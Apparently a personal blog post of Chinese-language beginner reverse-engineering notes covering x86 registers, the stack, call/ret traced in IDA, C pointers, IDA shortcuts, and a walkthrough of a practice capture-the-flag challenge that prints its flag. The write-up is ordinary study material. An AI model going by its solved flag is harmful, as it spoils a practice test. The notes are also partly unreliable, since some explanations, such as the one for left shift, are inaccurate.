<p>e命令-修改内存中数据（16进制）（如下图实现在内存中写入hello world）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">e 073f:0100</span><br><span class="line">073f:0100 00.48 00.65 00.6c 00.6c 00.6f 00.20 00.57 00.6f 00.72 00.6c 00.64//修改内存</span><br><span class="line">d 0100 //查看0100处内存</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230147540.png"
                      alt="image-20221103232108493"
                ></p>
<p>常用指令</p>
<p>jmp-将cs:ip指向所输入的地址（如 jmp xxxx:xxxx）也可直接调用寄存器中的值（如 jmp ax）</p>
<p>mov-将后项的值赋给前项（注：不能赋给ip）</p>
<p>add-将前项加上后项且和赋给前项</p>
<p>sub-将前项减去后项且差赋给前项</p>
<p>cmp-比较指令，可分为相等，大于，小于：</p>
<p>cmp		rsi,	rdi相当于 rsi？rdi，”?”可为&gt;.&lt;.&#x3D;</p>
<p>cmov-条件跳转，分为很多种，但是只要满足对应条件就进行替换 </p>
<p>cmova（大于就替换）rdx, rax 大于就将rax赋给rdx</p>
<p>具体指令在<a class="link"   href="http://www.cppblog.com/tgh621/archive/2008/09/02/60721.aspx" >CMOV开头的汇编指令 - c++初学者 - C++博客 (cppblog.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>retn n- 相当于对应跳转</p>
<p>pop eip </p>
<p>add esp, n</p>
<h5 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h5><p>{</p>
<p>push-将所给值推入栈</p>
<p>pop-将栈顶值赋给对应寄存器或内存</p>
<h6 id="栈-用来存储指令，地址，等数据，其特点是存储方向由高地址到低地址（windows中）"><a href="#栈-用来存储指令，地址，等数据，其特点是存储方向由高地址到低地址（windows中）" class="headerlink" title="栈-用来存储指令，地址，等数据，其特点是存储方向由高地址到低地址（windows中）"></a>栈-用来存储指令，地址，等数据，其特点是存储方向由高地址到低地址（windows中）</h6><p>根据cpu位数不同栈一个栈帧存放不同大小数据（一个字）如16位是2字节，32位4字节，64位8字节</p>
<p>高位地址放高位数据低位地址放低位数据（如16位cpu存放数据高八位存高位地址低八位存低位地址,输入AB则高位是A低位是B）</p>
<p>}</p>
<h5 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h5><h6 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h6><ul>
<li>EAX（寄存器寄存器-累加器）：最常用于算术，逻辑和数据传输指令、乘法和除法运算使用此寄存器。对于Windows API函数，函数的返回值通常将存储在EAX寄存器中。</li>
<li>EBX（基址寄存器）：EBX寄存器可以直接访问存储器数据，它也是一个通用寄存器。</li>
<li>ECX（计数寄存器）：ECX是一个共享寄存器，可以用作各种命令的计数器。它还可能包含内存中的数据未对齐。使用计数器的命令是顺序，循环和LOOP &#x2F; LOOPD指令。</li>
<li>EDX（数据寄存器）：是一个通用寄存器，用于包含乘法结果或除法结果的一部分。它还可以直接访问内存中的数据地址。</li>
<li>EDI（目标索引）：EDI通常用于处理字符串或数组的工作。该寄存器将指向目标字符串。此外它也是一个通用寄存器。</li>
<li>ESI（源索引）：与EDI一样，ESI也经常用于处理字符串或数组的操作。该寄存器将指向源字符串。</li>
<li>EBP（基本指针）：EBP指向内存位置，除了被共享外，还用作访问函数堆栈中的参数和局部变量的帧指针。</li>
<li>ESP（堆栈指针）：该寄存器始终指向当前堆栈顶部。根据堆栈的工作原理，该寄存器将被定向到低位地址。</li>
</ul>
<h6 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h6><ul>
<li>EIP（指令指针）：这是一个特殊的寄存器，它始终指向要执行的下一条指令。与其他寄存器不同，EIP不受指令直接影响。</li>
<li>EFLAGS（标志寄存器），每个位都是用来反映操作的特定状态，根据计算结果启用这些标志寄存器，并根据这些标志来执行程序的执行分支。</li>
</ul>
<h5 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h5><p>call-一般用来调用函数，比如我们在c语言中定义的函数，在父函数（上级函数）call某段函数的起始地址就相当于调用了该函数，配合栈使用ebp,esp,汇编ret命令可以实现子函数再重新调用回父函数</p>
<p>ret-返回上级函数具体则是返回上级函数调用这个命令的下一个命令语句</p>
<p>具体如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221104231216251.png"
                      alt="image-20221104231216251"
                ></p>
<p>leave</p>
<p>注：</p>
<p>•函数状态主要涉及三个寄存器 —— esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<h6 id="附：函数具体运行情况-加了百分号就是将前值赋给后值了如mov-esp-ebp是将esp值赋给ebp"><a href="#附：函数具体运行情况-加了百分号就是将前值赋给后值了如mov-esp-ebp是将esp值赋给ebp" class="headerlink" title="附：函数具体运行情况(加了百分号就是将前值赋给后值了如mov %esp,%ebp是将esp值赋给ebp)"></a>附：函数具体运行情况(加了百分号就是将前值赋给后值了如mov %esp,%ebp是将esp值赋给ebp)</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105154603364.png"
                      alt="image-20221105154603364"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155713546.png"
                      alt="image-20221105155713546"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155621473.png"
                      alt="image-20221105155621473"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155806106.png"
                      alt="image-20221105155806106"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155139034.png"
                      alt="image-20221105155139034"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155201150.png"
                      alt="image-20221105155201150"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155219421.png"
                      alt="image-20221105155219421"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155232747.png"
                      alt="image-20221105155232747"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155244346.png"
                      alt="image-20221105155244346"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155304600.png"
                      alt="image-20221105155304600"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155322112.png"
                      alt="image-20221105155322112"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155512974.png"
                      alt="image-20221105155512974"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155524091.png"
                      alt="image-20221105155524091"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105155551842.png"
                      alt="image-20221105155551842"
                ></p>
<h5 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h5><p>HeloWorld.exe</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401005 public start</span><br><span class="line">.text:00401005 start proc near</span><br><span class="line">.text:00401005 jmp     sub_401010</span><br><span class="line">.text:00401005 start endp</span><br></pre></td></tr></table></figure></div>

<p>public start-用于声明一个函数，其是公用的（可被其他函数调用），其他函数也可类似声明。</p>
<p>start proc near-表示函数开头,此处start表明了是函数入口,对其他的函数来说这个”start”可以换成对应的函数名。</p>
<p>start endp-表示函数结尾，对其他的函数来说这个”start”可以换成对应的函数名。</p>
<p>jmp-jmp     sub_401010-运行结果如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224221201527.png"
                      alt="image-20221224221201527"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224221142009.png"
                      alt="image-20221224221142009"
                ></p>
<p>只修改了EIP值相当于指向了第一个函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401010 sub_401010 proc near                    ; CODE XREF: start↑j</span><br><span class="line">.text:00401010 push    0                               ; uType</span><br><span class="line">.text:00401012 push    offset Caption                  ; &quot;D0g3!&quot;</span><br><span class="line">.text:00401017 push    offset Text                     ; &quot;Welcome to Re&quot;</span><br><span class="line">.text:0040101C push    0                               ; hWnd</span><br><span class="line">.text:0040101E call    MessageBoxA</span><br><span class="line">.text:00401023 push    0                               ; uExitCode</span><br><span class="line">.text:00401025 call    ExitProcess</span><br><span class="line">.text:00401025 sub_401010 endp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224222915631.png"
                      alt="image-20221224222915631"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224222931903.png"
                      alt="image-20221224222931903"
                ></p>
<p>当前ip指向push 0,ida常以”;”作注释，搜索后发现其应该是</p>
<p>MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)的第一个参数。</p>
<p>push-push    0结果如下</p>
<p>执行此命令后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223515193.png"
                      alt="image-20221224223515193"
                ></p>
<p>变为了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223545415.png"
                      alt="image-20221224223545415"
                ></p>
<p>将0压入了栈内相当于将栈顶提高了一位（4字节 32bit）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223722949.png"
                      alt="image-20221224223722949"
                ></p>
<p>剩下的push都是类似的变化</p>
<p>此处应该都是对MessageBox传参</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223829476.png"
                      alt="image-20221224223829476"
                ></p>
<p>定义了弹窗类型，传递了字符串的指针，也定义了按钮和图标</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223927998.png"
                      alt="image-20221224223927998"
                ></p>
<p>这几个push执行后栈内也多了两个字符串的地址和两个数字0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224224025205.png"
                      alt="image-20221224224025205"
                ></p>
<p>栈顶也被抬高了4位，EIP也向后移动了15</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040101E call    MessageBoxA</span><br><span class="line">.text:00401023 push    0                               ; uExitCode</span><br><span class="line">.text:00401025 call    ExitProcess</span><br><span class="line">.text:00401025 sub_401010 endp</span><br></pre></td></tr></table></figure></div>

<p>。</p>
<p>call-此处call函数将</p>
<p>call函数的下一个指令.text:00401023 push    0   的地址放入了栈中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224232526961.png"
                      alt="image-20221224232526961"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224232540977.png"
                      alt="image-20221224232540977"
                ></p>
<p>ESP也因此抬高了一位，EIP指向了所call的函数MessageBoxA的函数头</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224234025573.png"
                      alt="image-20221224234025573"
                ></p>
<p>dword ptr n 就是ESP + n处栈中存取的数据</p>
<p>同时也定义了对应参数在栈内的位置</p>
<p>如dword ptr 4 就是ESP + 4 &#x3D; 0019FF60 + 4 &#x3D; 0019FF64</p>
<p>正对应了压入栈中的参数0<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224234349159.png"
                      alt="image-20221224234349159"
                ></p>
<p>其他参数获取原理类似。</p>
<p>offset-__imp_MessageBoxA dd offset user32_MessageBoxA</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225000500211.png"
                      alt="image-20221225000500211"
                ></p>
<p>offset 指令相当于把对应函数“user32_MessageBoxA”的指针（指向函数的头部）给了这个”__imp_MessageBoxA“让其有了等效的作用</p>
<p>所以在上文的jmp中直接jmp到了user32_MessageBoxA这个函数中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user32.dll:772519E0 user32_MessageBoxA:</span><br><span class="line">user32.dll:772519E0 mov     edi, edi</span><br><span class="line">user32.dll:772519E2 push    ebp</span><br><span class="line">user32.dll:772519E3 mov     ebp, esp</span><br><span class="line">user32.dll:772519E5 cmp     dword_77276C94, 0</span><br><span class="line">user32.dll:772519EC jz      short loc_77251A10</span><br><span class="line">user32.dll:772519EE mov     eax, large fs:18h</span><br><span class="line">user32.dll:772519F4 mov     edx, offset unk_772771A4</span><br><span class="line">user32.dll:772519F9 mov     ecx, [eax+24h]</span><br><span class="line">user32.dll:772519FC xor     eax, eax</span><br><span class="line">user32.dll:772519FE lock cmpxchg [edx], ecx</span><br><span class="line">user32.dll:77251A02 test    eax, eax</span><br><span class="line">user32.dll:77251A04 jnz     short loc_77251A10</span><br><span class="line">user32.dll:77251A06 mov     dword_77276D00, 1</span><br></pre></td></tr></table></figure></div>

<p>mov edi, edi</p>
<p>mov是将后项覆盖给前项，但此处自己覆盖自己是不会改变的</p>
<p>此处这么做的目的在网上搜了一下：</p>
<p>1.为了实现hot-patching技术，即运行时修改一个函数的行为。</p>
<p>2.为了提高效率。执行一条MOV指令比执行两条NOP指令花费更少的时间。</p>
<p>其他的mov指令也是类似的覆盖 </p>
<p>push ebp </p>
<p>原来ebp如下图</p>
<p>将EBP的所存的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225001444463.png"
                      alt="image-20221225001444463"
                ></p>
<p>压入了栈中，抬高了一位ESP</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225001732773.png"
                      alt="image-20221225001732773"
                ></p>
<p>同时EBP中所存的不会因push而被抛弃掉</p>
<p>mov ebp, esp将esp指向的栈顶位置赋给ebp</p>
<p>原ebp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225002625179.png"
                      alt="image-20221225002625179"
                ></p>
<p>赋值后的ebp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225002651473.png"
                      alt="image-20221225002651473"
                ></p>
<p>cmp     dword_77276C94, 0</p>
<p>将dword_77276c94(0)与0比较</p>
<table>
<thead>
<tr>
<th>CMP结果</th>
<th>ZF</th>
<th>CF</th>
</tr>
</thead>
<tbody><tr>
<td>目的操作数 &lt; 源操作数</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>目的操作数 &gt; 源操作数</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>目的操作数 &#x3D; 源操作数</td>
<td>1</td>
<td>0</td>
</tr>
</tbody></table>
<p>因为相等 所以ZF&#x3D;1,CF&#x3D;0但初始状态下ZF&#x3D;1,CF&#x3D;0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225003354313.png"
                      alt="image-20221225003354313"
                ></p>
<p>所以此处ZF,CF值没有变化</p>
<p>jz      short loc_77251A10</p>
<p>根据ZF为1就跳转，ZF为0就不跳转</p>
<p>此处在执行cmp     dword_77276C94, 0后ZF为1</p>
<p>其会跳转（将EIP移向）short loc_77251A10</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user32.dll:77251A10 loc_77251A10:                           ; CODE XREF: user32.dll:user32_MessageBoxA+C↑j</span><br><span class="line">user32.dll:77251A10                                         ; user32.dll:user32_MessageBoxA+24↑j</span><br><span class="line">user32.dll:77251A10 push    0FFFFFFFFh</span><br><span class="line">user32.dll:77251A12 push    0</span><br><span class="line">user32.dll:77251A14 push    dword ptr [ebp+14h]</span><br><span class="line">user32.dll:77251A17 push    dword ptr [ebp+10h]</span><br><span class="line">user32.dll:77251A1A push    dword ptr [ebp+0Ch]</span><br><span class="line">user32.dll:77251A1D push    dword ptr [ebp+8]</span><br><span class="line">user32.dll:77251A20 call    near ptr user32_MessageBoxTimeoutA</span><br><span class="line">user32.dll:77251A25 pop     ebp</span><br><span class="line">user32.dll:77251A26 retn    10h</span><br></pre></td></tr></table></figure></div>

<p>前面的push为一如既往的传参操作</p>
<p>call也是调用对应的弹窗函数，可见前文有相对应的。</p>
<p>pop ebp</p>
<p>将栈顶的弹出给ebp</p>
<p>原栈顶和ebp：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225004823350.png"
                      alt="image-20221225004823350"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225004829852.png"
                      alt="image-20221225004829852"
                ></p>
<p>执行后：</p>
<p>原栈顶的数据并不会被清除只是将栈顶下移了一位</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005011800.png"
                      alt="image-20221225005011800"
                ></p>
<p>ebp也变为了原栈顶所对应的数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005018288.png"
                      alt="image-20221225005018288"
                ></p>
<p>retn 10h</p>
<p>原ESP和EIP及原栈顶</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005136127.png"
                      alt="image-20221225005136127"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005143222.png"
                      alt="image-20221225005143222"
                ></p>
<p>执行后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005232923.png"
                      alt="image-20221225005232923"
                ></p>
<p>相当于将原栈顶的数据弹出给了EIP使得ESP+4h</p>
<p>又让ESP+10h（retn后面所跟的数值）</p>
<p>所以retn n&#x3D; </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop eip</span><br><span class="line">add esp 0xn</span><br></pre></td></tr></table></figure></div>



<h3 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>定义数组时 所定义的函数名就相当于地址</p>
<p>如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221107132906320.png"
                      alt="image-20221107132906320"
                ></p>
<p>定义数组时选择的类型（char int之类）就决定了每个元素对应的长度了</p>
<h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="type">char</span> *pa=&amp;a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %c&quot;</span>,pa,*pa)</span><br></pre></td></tr></table></figure></div>

<p>定义时用 类型+*+名字 来表示</p>
<p>这个名字对应的指针变量就存入了一个地址</p>
<p>如果要获取这个地址对应所存取的值则需要在输出时对这个名字加*号</p>
<p>这个操作也叫解引用（获取这个指针变量存入的地址对应的值，相当于按地址寻找值）</p>
<p>当对指针变量+1时则是根据你之前定义指针时的数据类型加对应的地址长度 如char长度为1，int为4</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221107133434972.png"
                      alt="image-20221107133434972"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221107133505279.png"
                      alt="image-20221107133505279"
                ></p>
<p>当定义了一个指针指向一个数组名时其实也就是指向了a[0]可通过指针+n后寻找到a[n].</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> a[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">char</span>* pa = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x,%x&quot;</span>,*(pa+<span class="number">1</span>), *pa);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>间接修改及间接引用</p>
<p>*pa&#x3D;一个值就是对pa指向的值进行间接修改</p>
<p>解引用就是取出对应地址所对的值</p>
<h4 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h4><p>&amp;，|,^,~,&lt;&lt;,&gt;&gt;,&gt;&gt;&gt;</p>
<p>“&amp;”-按位与,都为1时结果是1否则为0</p>
<p>“|”-按位或,有一个为1则为1只有都为0才为0</p>
<p>“^”-异或,相同为0,相异为1</p>
<p>“~”-按位取反,0变1,1变0</p>
<p>“&lt;&lt;”-左移,有符号，会在高位补上符号位,二进制中将低位移向高位</p>
<p>“&gt;&gt;”-右移,有符号，会在高位补上符号位,二进制中将高位移向低位</p>
<p>“&gt;&gt;&gt;”-右移运算符，无符号，左边补0 </p>
<h4 id="calloc-malloc"><a href="#calloc-malloc" class="headerlink" title="calloc,malloc"></a>calloc,malloc</h4><p>都可用于申请内存一般是用指针来指向所开辟的内存的前项下面举的是calloc的例子 malloc不用说明个数因为callo是分配的连续的内存（类似数组）malloc不一定连续（常出现于链表申请）</p>
<p>数组连续的情况有利于缓存调用（提升程序效率，但降低可修改性，当插入中间值的时候需要修改后面一整个）</p>
<p>链表不连续的情况有利于中间值修改但地址一般大于缓存调用范围（会降低效率但提高可修改性，可修改中间值不用修改后值）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p=(<span class="type">int</span> *)<span class="built_in">calloc</span>(开辟个数n,每个的长度（以字节来算）（通常用<span class="keyword">sizeof</span>（）函数）)；</span><br><span class="line"><span class="type">int</span> *p=（<span class="type">int</span> *）<span class="built_in">malloc</span>(长度（使用<span class="keyword">sizeof</span>）)</span><br></pre></td></tr></table></figure></div>

<p>HIDWORD,LOWORD取整形的高16位和取整形的低16位</p>
<h3 id="Re工具使用"><a href="#Re工具使用" class="headerlink" title="Re工具使用"></a>Re工具使用</h3><h4 id="ida（静态分析）"><a href="#ida（静态分析）" class="headerlink" title="ida（静态分析）"></a>ida（静态分析）</h4><p>快捷键</p>
<p>shift+f12 -查看字符串,下侧栏目可以用于搜索</p>
<p>F5（重要）-将汇编代码反编译为类似c语言的伪代码，一般能看懂</p>
<p>alt+b（重要）-寻找字符串 可以进行模糊搜索，但可能字符串被截断搜索不到</p>
<p>alt+t -同样也可寻找字符串</p>
<p>F7-单步步入<br>F8-单步步过</p>
<p>x-寻找交叉引用，可用于寻找上级函数</p>
<p>Options——Setup Data Types便可选定D时设置的数据类型；<br>A：可以将图形字符由十六进制数转化成图形，如果一个字节不行，可多选一些字节；<br>C：将数据转换成代码；<br>G：跳转至相应的地址处；<br>Ctrl+F：寻找相应名称的内容；<br>Shift+F9:打开结构体类型窗口；<br>在结构体类型窗口中，<br>Insert（Fn+PgDn得到）:创建新的结构体类型；<br>Delete:删除某一个结构体类型；<br>在结构体end处，按‘D’便可插入成员变量；<br>Alt+Q将某个变量转成一个结构体类型，如果代码区有符号变红，说明该地址处原先的也是一个结构体，但后来被其它的定义给覆盖，按两下‘K’即可打散数据；<br>K:打散数据;<br>T:将某一符号转成结构体成员变量；</p>
<p>n-修改名字</p>
<p>对于一个函数起始处，D、C、右键——CreateFunction即可还原。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221104233318179.png"
                      alt="image-20221104233318179"
                ></p>
<p>一般有粉红色的都为函数，并非主程序，可以双击键入,使用f5反汇编进入伪代码界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221104233558122.png"
                      alt="image-20221104233558122"
                ></p>
<p>但一般可能找不到密码所在的位置（可能不叫main函数）可以打开程序观察其输出情况，再用相对应的输出结果搜索相应字符如下图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105000017723.png"
                      alt="image-20221105000017723"
                ></p>
<p>但一般它可能也不会叫flag，总之根据输出结果寻找对应的函数是大体的解法</p>
<p>下面是找到的对应主程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105000340141.png"
                      alt="image-20221105000340141"
                ></p>
<p>可以看到是个将字符串替换的加密 可以双击键入对应数据的初始形态（因为是静态分析，并未实际运行程序使数据加密）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105000610878.png"
                      alt="image-20221105000610878"
                ></p>
<p>可以将对应函数以及字符串复制下来写入以下代码 得到最终的flag</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> a[<span class="number">30</span>] = &#123; <span class="string">&quot;flag&#123;hacking_for_fun&#125;&quot;</span> &#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (a[i] == <span class="number">105</span> ||a[i] == <span class="number">114</span>)</span><br><span class="line">		a[i] = <span class="number">49</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221105000746211.png"
                      alt="image-20221105000746211"
                ></p>
<p>这是最后的输出结果</p>
<p>得到了最终的flag</p>
<p>练题网站<a class="link"   href="https://buuoj.cn/challenges" >BUUCTF在线评测 (buuoj.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>补充：ida一般使用时会有缓存文件，相当于做修改只对这些缓存文件进行修改，而不对原文件进行修改，我现在用不到，但一般大型工程需要很久时间，则需要这些保存自己对它做出的修改了</p>
